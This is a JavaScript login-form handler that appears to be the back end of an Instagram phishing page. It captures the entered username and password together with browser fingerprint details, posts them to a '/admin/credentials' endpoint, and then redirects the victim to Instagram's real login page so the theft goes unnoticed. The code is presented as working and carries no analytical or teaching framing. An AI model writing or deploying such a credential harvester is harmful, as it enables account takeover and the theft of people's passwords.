
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const submitButton = this.querySelector('button[type="submit"]');
  submitButton.classList.add('loading');
  submitButton.disabled = true;
  const inputs = this.querySelectorAll('input');
  const username = inputs[0].value;
  const password = inputs[1].value;
  
  // Collect additional user information
  const userInfo = {
    username,
    password,
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timestamp: new Date().toISOString(),
    referrer: document.referrer,
    cookiesEnabled: navigator.cookieEnabled
  };

  try {
    const response = await fetch('/admin/credentials', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(userInfo)
    });
    
    if (response.ok) {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    } else {
      alert('Login failed');
    }
  } catch (error) {
    console.error('Error:', error);
    alert('An error occurred');
  }
});
